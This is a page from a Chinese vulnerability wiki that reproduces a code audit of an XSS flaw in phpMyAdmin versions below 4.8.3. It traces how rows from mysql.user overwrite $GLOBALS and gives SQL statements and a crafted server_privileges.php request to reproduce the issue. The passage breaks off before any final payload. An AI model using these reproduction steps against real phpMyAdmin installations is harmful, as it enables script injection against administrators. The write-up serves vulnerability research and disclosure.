<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Phpmyadmin/Phpmyadmin%20_%204.8.3%20XSS/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Phpmyadmin \&lt; 4.8.3 XSS - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Phpmyadmin \\\u0026lt; 4.8.3 XSS", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_5" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Phpmyadmin%20setup%E9%A1%B5%E9%9D%A2%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%95%B4%E5%90%88/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Phpmyadmin%20setup%E9%A1%B5%E9%9D%A2%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%95%B4%E5%90%88/" class="btn btn-xs btn-link">
        Phpmyadmin setup页面配置不当的利用姿势整合
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Phpcms/%EF%BC%88CVE-2018-19127%EF%BC%89Phpcms2008%20Type.php%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Phpcms/%EF%BC%88CVE-2018-19127%EF%BC%89Phpcms2008%20Type.php%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2018-19127）Phpcms2008 Type.php代码注入漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="phpmyadmin-483-xss">Phpmyadmin \&lt; 4.8.3 XSS<a class="headerlink" href="#phpmyadmin-483-xss" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>最近在审计phpmyadmin的时候发现了一个XSS漏洞，后来发现在版本大于4.8.3以后该漏洞被修复了。看了下之前公布的CVE，有个CVE和此漏洞很相似但没有漏洞细节，于是乎便有了这篇文章。</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Phpmyadmin \&lt; 4.8.3</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>在审计phpmyadmin时，我比较关注$GLOBALS全局变量，该变量存储了本次请求的信息、phpmyadmin基本设置信息和phpmyadmin配置文件信息等。先看看/libraries/classes/Server/Privileges.php::3977的以下代码。</p>
<div class="codehilite"><pre><span></span><code>foreach ($row as $key =&gt; $value) {
    $GLOBALS[$key] = $value;
}
</code></pre></div>

<p>很明显，该处是$GLOBALS的赋值操作，而$row来自于对mysql.user表的查询结果，且$user_host_condition可控，/libraries/classes/Server/Privileges.php::3966行</p>
<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="n">static</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">getDataForChangeOrCopyUser</span><span class="p">()</span>
<span class="w">    </span><span class="err">{</span>
<span class="w">        </span><span class="n">$queries</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="no">null</span><span class="p">;</span>
<span class="w">        </span><span class="n">$password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="no">null</span><span class="p">;</span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="n">$_REQUEST</span><span class="err">[</span><span class="s1">&#39;change_copy&#39;</span><span class="err">]</span><span class="p">))</span><span class="w"> </span><span class="err">{</span>
<span class="w">            </span><span class="n">$user_host_condition</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39; WHERE `User` = &#39;</span>
<span class="w">                </span><span class="p">.</span><span class="w"> </span><span class="s2">&quot;&#39;&quot;</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="n">$GLOBALS</span><span class="err">[</span><span class="s1">&#39;dbi&#39;</span><span class="err">]</span><span class="o">-&gt;</span><span class="n">escapeString</span><span class="p">(</span><span class="n">$_REQUEST</span><span class="err">[</span><span class="s1">&#39;old_username&#39;</span><span class="err">]</span><span class="p">)</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="s2">&quot;&#39;&quot;</span>
<span class="w">                </span><span class="p">.</span><span class="w"> </span><span class="s1">&#39; AND `Host` = &#39;</span>
<span class="w">                </span><span class="p">.</span><span class="w"> </span><span class="s2">&quot;&#39;&quot;</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="n">$GLOBALS</span><span class="err">[</span><span class="s1">&#39;dbi&#39;</span><span class="err">]</span><span class="o">-&gt;</span><span class="n">escapeString</span><span class="p">(</span><span class="n">$_REQUEST</span><span class="err">[</span><span class="s1">&#39;old_hostname&#39;</span><span class="err">]</span><span class="p">)</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="s2">&quot;&#39;;&quot;</span><span class="p">;</span>
<span class="w">            </span><span class="n">$row</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$GLOBALS</span><span class="err">[</span><span class="s1">&#39;dbi&#39;</span><span class="err">]</span><span class="o">-&gt;</span><span class="n">fetchSingleRow</span><span class="p">(</span>
<span class="w">                </span><span class="s1">&#39;SELECT * FROM `mysql`.`user` &#39;</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="n">$user_host_condition</span>
<span class="w">            </span><span class="p">);</span>
</code></pre></div>

<p>既然上述代码会将mysql.user中符合条件的行的列名和值写入$GLOBALS中,我们便可通过添加mysql.user的列来往$GLOBALS中写入任意键值。清楚思路后，我们看看哪里调用了Privileges.php的getDataForChangeOrCopyUser函数,发现在server_privileges.php::178中对该函数有调用。</p>
<div class="codehilite"><pre><span></span><code><span class="nt">list</span><span class="o">($</span><span class="nt">queries</span><span class="o">,</span><span class="w"> </span><span class="o">$</span><span class="nt">password</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">Privileges</span><span class="p">::</span><span class="nd">getDataForChangeOrCopyUser</span><span class="o">();</span>
</code></pre></div>

<p>这时我们来试试向$GLOBALS中写一个$GLOBALS[\'xz\']=\'aliyun\'。进入mysql库，执行以下2条sql语句向user表添加xz字段，并插入一条数据。</p>
<div class="codehilite"><pre><span></span><code><span class="n">ALTER</span><span class="w"> </span><span class="n">TABLE</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">ADD</span><span class="w"> </span><span class="n">xz</span><span class="w"> </span><span class="n">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>
<span class="n">INSERT</span><span class="w"> </span><span class="n">INTO</span><span class="w"> </span><span class="err">`</span><span class="n">user</span><span class="err">`</span><span class="w"> </span><span class="p">(</span><span class="err">`</span><span class="n">Host</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">User</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Password</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Select_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Insert_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Update_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Delete_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Create_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Drop_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Reload_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Shutdown_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Process_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">File_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Grant_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">References_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Index_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Alter_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Show_db_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Super_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Create_tmp_table_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Lock_tables_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Execute_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Repl_slave_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Repl_client_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Create_view_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Show_view_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Create_routine_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Alter_routine_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Create_user_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Event_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Trigger_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">Create_tablespace_priv</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">ssl_type</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">max_questions</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">max_updates</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">max_connections</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">max_user_connections</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">plugin</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">authentication_string</span><span class="err">`</span><span class="p">,</span><span class="w"> </span><span class="err">`</span><span class="n">xz</span><span class="err">`</span><span class="p">)</span><span class="w"> </span><span class="n">VALUES</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;test&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;aliyun&#39;</span><span class="p">);</span>
</code></pre></div>

<p>在/libraries/classes/Server/Privileges.php::3980下断点</p>
<div class="codehilite"><pre><span></span><code><span class="err">$</span><span class="n">serverVersion</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">GLOBALS</span><span class="p">[</span><span class="s">&#39;dbi&#39;</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">getVersion</span><span class="p">();</span>
</code></pre></div>

<p>然后构造http://127.0.0.1/phpMyAdmin-4.8.2/server_privileges.php?change_copy=aa&amp;old_username=test&amp;old_hostname=127.0.0.1&amp;mode=5
参数请求，change_copy随便给个参数即可，mode必须大于4否则新添加的数据会被删除。</p>
<p><img alt="1.png" src="./resource/Phpmyadmin&lt;4.8.3XSS/media/rId24.png" />可以看到$GLOBALS[\'xz\']=\'aliyun\'已经成功赋值。</p>
<h3 id="_4">利用构造<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<p>有了可控的$GLOBALS变量后，我们需要寻找触发点。要在一次请求便触发漏洞，公共页面是首选目标。通过全局搜索$GLOBALS变量，发现在libraries/classes/Navigation/NavigationTree.php::1272的renderDbSelect函数中有使用未过滤的$GLOBALS变量。</p>
<div class="codehilite"><pre><span></span><code><span class="o">$</span><span class="nt">retval</span><span class="w"> </span><span class="o">.=</span><span class="w"> </span><span class="s1">&#39;&lt;div&gt;&#39;</span><span class="o">;</span>
<span class="w">        </span><span class="o">$</span><span class="nt">retval</span><span class="w"> </span><span class="o">.=</span><span class="w"> </span><span class="s1">&#39;&lt;form action=&quot;index.php&quot;&gt;&#39;</span><span class="o">;</span>
<span class="w">        </span><span class="o">$</span><span class="nt">retval</span><span class="w"> </span><span class="o">.=</span><span class="w"> </span><span class="nt">Url</span><span class="p">::</span><span class="nd">getHiddenFields</span><span class="o">($</span><span class="nt">url_params</span><span class="o">);</span>
<span class="w">        </span><span class="o">$</span><span class="nt">retval</span><span class="w"> </span><span class="o">.=</span><span class="w"> </span><span class="s1">&#39;&lt;select name=&quot;db&quot; class=&quot;hide&quot; id=&quot;navi_db_select&quot;&gt;&#39;</span>
<span class="w">            </span><span class="o">.</span><span class="w"> </span><span class="s1">&#39;&lt;option value=&quot;&quot; dir=&quot;&#39;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">$</span><span class="nt">GLOBALS</span><span class="cp">[</span><span class="s1">&#39;text_dir&#39;</span><span class="cp">]</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="s1">&#39;&quot;&gt;&#39;</span>
</code></pre></div>

<p>继续搜索调用renderDbSelect函数地方，发现libraries\classes\Navigation\Navigation.php::62的getDisplay函数。</p>
<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">getDisplay</span><span class="p">()</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="o">/*</span><span class="w"> </span><span class="n">Init</span><span class="w"> </span><span class="o">*/</span>
<span class="w">        </span><span class="o">$</span><span class="n">retval</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="w">        </span><span class="o">$</span><span class="n">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Response</span><span class="p">::</span><span class="n">getInstance</span><span class="p">();</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="o">$</span><span class="n">response</span><span class="o">-&gt;</span><span class="n">isAjax</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="o">$</span><span class="n">header</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">NavigationHeader</span><span class="p">();</span>
<span class="w">            </span><span class="o">$</span><span class="n">retval</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">header</span><span class="o">-&gt;</span><span class="n">getDisplay</span><span class="p">();</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="o">$</span><span class="n">tree</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">NavigationTree</span><span class="p">();</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="o">$</span><span class="n">response</span><span class="o">-&gt;</span><span class="n">isAjax</span><span class="p">()</span>
<span class="w">            </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="w"> </span><span class="n">empty</span><span class="p">(</span><span class="o">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="s1">&#39;full&#39;</span><span class="p">])</span>
<span class="w">            </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="w"> </span><span class="n">empty</span><span class="p">(</span><span class="o">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="s1">&#39;reload&#39;</span><span class="p">])</span>
<span class="w">        </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">GLOBALS</span><span class="p">[</span><span class="s1">&#39;cfg&#39;</span><span class="p">][</span><span class="s1">&#39;ShowDatabasesNavigationAsTree&#39;</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="o">//</span><span class="w"> </span><span class="n">provide</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="n">tree</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">navigation</span>
<span class="w">                </span><span class="o">$</span><span class="n">navRender</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">tree</span><span class="o">-&gt;</span><span class="n">renderState</span><span class="p">();</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="o">//</span><span class="w"> </span><span class="n">provide</span><span class="w"> </span><span class="n">legacy</span><span class="w"> </span><span class="n">pre</span><span class="o">-</span><span class="mf">4.0</span><span class="w"> </span><span class="n">navigation</span>
<span class="w">                </span><span class="o">$</span><span class="n">navRender</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">tree</span><span class="o">-&gt;</span><span class="n">renderDbSelect</span><span class="p">();</span>
</code></pre></div>

<p>继续搜索实例化Naviagtion类并且调用了getDisplay函数的地方，发现libraries\classes\Header.php::440的getDisplay函数有调用。</p>
<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">getDisplay</span><span class="p">()</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="err">$</span><span class="n">retval</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#39;&#39;</span><span class="p">;</span>
<span class="w">        </span><span class="p">...(</span><span class="err">省略</span><span class="p">)</span>
<span class="w">                </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_menuEnabled</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="err">$</span><span class="n">GLOBALS</span><span class="p">[</span><span class="s">&#39;server&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="err">$</span><span class="n">nav</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">Navigation</span><span class="p">();</span>
<span class="w">                    </span><span class="err">$</span><span class="n">retval</span><span class="w"> </span><span class="p">.</span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">nav</span><span class="o">-&gt;</span><span class="n">getDisplay</span><span class="p">();</span>
<span class="w">                </span><span class="p">}</span>
</code></pre></div>

<p>搜索实例化Header-&gt;GetDisplay的方法，发现\libraries\classes\Response.php::100的构造方法中实例化了Header类，而$this-_header又在_getDisplay中被调用。_getDisplay被_htmlResponse调用，_htmlResponse在response函数中被调用。</p>
<div class="codehilite"><pre><span></span><code><span class="n">private</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">()</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="n">defined</span><span class="p">(</span><span class="s1">&#39;TESTSUITE&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="o">$</span><span class="n">buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">OutputBuffering</span><span class="p">::</span><span class="n">getInstance</span><span class="p">();</span>
<span class="w">            </span><span class="o">$</span><span class="n">buffer</span><span class="o">-&gt;</span><span class="n">start</span><span class="p">();</span>
<span class="w">            </span><span class="n">register_shutdown_function</span><span class="p">(</span><span class="n">array</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;response&#39;</span><span class="p">));</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_header</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">Header</span><span class="p">();</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_HTML</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_JSON</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="p">();</span>
</code></pre></div>

<p>\libraries\classes\Response.php::266行</p>
<div class="codehilite"><pre><span></span><code><span class="n">private</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">_getDisplay</span><span class="p">()</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// The header may contain nothing at all,</span>
<span class="w">        </span><span class="c1">// if its content was already rendered</span>
<span class="w">        </span><span class="c1">// and, in this case, the header will be</span>
<span class="w">        </span><span class="c1">// in the content part of the request</span>
<span class="w">        </span><span class="err">$</span><span class="n">retval</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_header</span><span class="o">-&gt;</span><span class="n">getDisplay</span><span class="p">();</span>
<span class="w">        </span><span class="err">$</span><span class="n">retval</span><span class="w"> </span><span class="p">.</span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_HTML</span><span class="p">;</span>
<span class="w">        </span><span class="err">$</span><span class="n">retval</span><span class="w"> </span><span class="p">.</span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_footer</span><span class="o">-&gt;</span><span class="n">getDisplay</span><span class="p">();</span>
<span class="w">        </span><span class="kr">return</span><span class="w"> </span><span class="err">$</span><span class="n">retval</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
</code></pre></div>

<p>\libraries\classes\Response.php::279行</p>
<div class="codehilite"><pre><span></span><code><span class="n">private</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">_htmlResponse</span><span class="p">()</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="n">echo</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_getDisplay</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>
</code></pre></div>

<p>\libraries\classes\Response.php::438行</p>
<div class="codehilite"><pre><span></span><code><span class="nt">public</span><span class="w"> </span><span class="nt">function</span><span class="w"> </span><span class="nt">response</span><span class="o">()</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="err">chdir($this-&gt;getCWD())</span><span class="p">;</span>
<span class="w">        </span><span class="err">$buffer</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="n">OutputBuffering</span><span class="p">:</span><span class="o">:</span><span class="nf">getInstance</span><span class="p">();</span>
<span class="w">        </span><span class="err">if</span><span class="w"> </span><span class="err">(empty($this-&gt;_HTML))</span><span class="w"> </span><span class="err">{</span>
<span class="w">            </span><span class="err">$this-&gt;_HTML</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">$buffer-&gt;getContents()</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="nt">if</span><span class="w"> </span><span class="o">($</span><span class="nt">this-</span><span class="o">&gt;</span><span class="nt">isAjax</span><span class="o">())</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="err">$this-&gt;_ajaxResponse()</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="nt">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="err">$this-&gt;_htmlResponse()</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="o">$</span><span class="nt">buffer-</span><span class="o">&gt;</span><span class="nt">flush</span><span class="o">();</span>
<span class="w">        </span><span class="nt">exit</span><span class="o">;</span>
<span class="w">    </span><span class="err">}</span>
</code></pre></div>

<p>这里注意__construct中的register_shutdown_function函数，看php
manual，意思是说当脚本运行结束或遇到exit后会执行该response函数，<img alt="2.png" src="./resource/Phpmyadmin&lt;4.8.3XSS/media/rId26.png" /><strong>意思就是说只要哪里实例化了Response类，在程序运行结束后就会执行response函数</strong>。真好，回到server_privileges.php::34行，发现有实例化Response。</p>
